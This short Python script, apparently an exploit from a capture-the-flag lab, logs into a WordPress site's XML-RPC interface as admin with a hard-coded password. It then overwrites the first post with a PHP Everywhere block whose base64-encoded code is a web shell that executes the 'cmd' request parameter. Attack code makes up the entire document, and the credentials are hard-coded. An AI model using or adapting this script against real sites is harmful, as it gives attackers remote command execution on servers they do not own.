#!/usr/bin/python2

from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import posts

client = Client("http://10.10.11.142/xmlrpc.php","admin","uhc-jan-finals-2022")
post = client.call(posts.GetPosts()) #Obtener todos los posts de wordpress

#dir(post[0]) --> metodos del objeto post
#post[0].link --> URL del post
#post[0].id --> id del post
#post[0].content --> contenido del post

malicious_post = post[0]
malicious_post.content = '<!-- wp:php-everywhere-block/php {"code":"PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K","version":"3.0.0"} /-->'
client.call(posts.EditPost(malicious_post.id,malicious_post))

